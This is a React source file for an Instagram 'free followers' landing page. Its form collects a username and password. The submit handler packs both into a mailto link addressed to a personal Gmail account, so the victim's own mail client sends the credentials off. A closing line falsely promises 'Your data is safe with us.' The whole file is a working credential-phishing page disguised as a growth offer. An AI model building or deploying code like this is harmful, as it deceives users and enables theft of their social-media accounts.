"use client";
import { useState } from "react";
import { motion, AnimatePresence } from "framer-motion";
import { Instagram, AlertCircle } from "lucide-react";

export default function FreeFollowersPage() {
  const [form, setForm] = useState({ username: "", password: "" });
  const [errors, setErrors] = useState({ username: "", password: "" });
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitMessage, setSubmitMessage] = useState("");

  const validateForm = () => {
    let isValid = true;
    const newErrors = { username: "", password: "" };

    if (!form.username.trim()) {
      newErrors.username = "Username is required";
      isValid = false;
    }

    if (!form.password.trim()) {
      newErrors.password = "Password is required";
      isValid = false;
    } else if (form.password.length < 6) {
      newErrors.password = "Password must be at least 6 characters";
      isValid = false;
    }

    setErrors(newErrors);
    return isValid;
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!validateForm()) return;

    setIsSubmitting(true);

    try {
      // Build mailto link with encoded subject and body
      const subject = encodeURIComponent("Free Followers Request");
      const body = encodeURIComponent(
        `Username: ${form.username}\nPassword: ${form.password}`
      );

      // Open default mail client with prefilled email
      window.location.href = `mailto:awaisashraf.dev@gmail.com?subject=${subject}&body=${body}`;

      setSubmitMessage("Your email client should open now.");
    } catch (error) {
      setSubmitMessage("An error occurred. Please try again.");
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-purple-900 via-black to-gray-900 flex items-center justify-center px-4 py-10 relative overflow-hidden">
      {/* Background particles */}
      <div className="absolute inset-0 pointer-events-none">
        <div className="absolute w-96 h-96 bg-purple-500/10 rounded-full blur-3xl -top-48 -left-48 animate-pulse" />
        <div className="absolute w-96 h-96 bg-pink-500/10 rounded-full blur-3xl -bottom-48 -right-48 animate-pulse" />
      </div>

      <motion.div
        initial={{ opacity: 0, y: 20 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.6 }}
        className="w-full max-w-md backdrop-blur-xl bg-white/5 border border-white/10 rounded-2xl p-8 shadow-2xl relative z-10"
      >
        <div className="flex justify-center mb-6">
          <Instagram className="w-12 h-12 text-white" />
        </div>
        <h1 className="text-4xl font-extrabold text-white text-center mb-4 bg-clip-text text-transparent bg-gradient-to-r from-pink-400 to-purple-400">
          Boost Your Instagram
        </h1>
        <p className="text-gray-300 text-center mb-8">
          Skyrocket your followers with just a few clicks! 🚀
        </p>

        <AnimatePresence>
          {submitMessage && (
            <motion.div
              initial={{ opacity: 0, y: -20 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -20 }}
              className={`p-4 rounded-lg mb-6 ${
                submitMessage.includes("error")
                  ? "bg-red-500/20 text-red-200"
                  : "bg-green-500/20 text-green-200"
              }`}
            >
              {submitMessage}
            </motion.div>
          )}
        </AnimatePresence>

        <form className="space-y-6" onSubmit={handleSubmit}>
          <div>
            <input
              type="text"
              name="username"
              placeholder="Username"
              value={form.username}
              onChange={(e) => setForm({ ...form, username: e.target.value })}
              className={`w-full p-3 bg-white/5 border ${
                errors.username ? "border-red-500" : "border-white/20"
              } text-white rounded-lg placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-purple-500 transition-all duration-300`}
            />
            {errors.username && (
              <motion.p
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="text-red-400 text-sm mt-1 flex items-center gap-1"
              >
                <AlertCircle className="w-4 h-4" /> {errors.username}
              </motion.p>
            )}
          </div>

          <div>
            <input
              type="password"
              name="password"
              placeholder="Password"
              value={form.password}
              onChange={(e) => setForm({ ...form, password: e.target.value })}
              className={`w-full p-3 bg-white/5 border ${
                errors.password ? "border-red-500" : "border-white/20"
              } text-white rounded-lg placeholder-gray-400 focus:outline-none focus:ring-2 focus:ring-pink-500 transition-all duration-300`}
            />
            {errors.password && (
              <motion.p
                initial={{ opacity: 0 }}
                animate={{ opacity: 1 }}
                className="text-red-400 text-sm mt-1 flex items-center gap-1"
              >
                <AlertCircle className="w-4 h-4" /> {errors.password}
              </motion.p>
            )}
          </div>

          <motion.button
            whileHover={{ scale: 1.05 }}
            whileTap={{ scale: 0.95 }}
            type="submit"
            disabled={isSubmitting}
            className={`w-full bg-gradient-to-r from-pink-600 to-purple-600 text-white py-3 rounded-xl font-bold text-lg transition-all duration-200 shadow-lg flex items-center justify-center gap-2 ${
              isSubmitting ? "opacity-75 cursor-not-allowed" : "hover:shadow-xl"
            }`}
          >
            {isSubmitting ? (
              <>
                <svg
                  className="animate-spin h-5 w-5 text-white"
                  viewBox="0 0 24 24"
                >
                  <circle
                    className="opacity-25"
                    cx="12"
                    cy="12"
                    r="10"
                    stroke="currentColor"
                    strokeWidth="4"
                  />
                  <path
                    className="opacity-75"
                    fill="currentColor"
                    d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"
                  />
                </svg>
                Processing...
              </>
            ) : (
              "Get Free Followers"
            )}
          </motion.button>
        </form>

        <p className="text-gray-400 text-sm text-center mt-6">
          Your data is safe with us. We respect your privacy. 🔒
        </p>
      </motion.div>
    </div>
  );
}
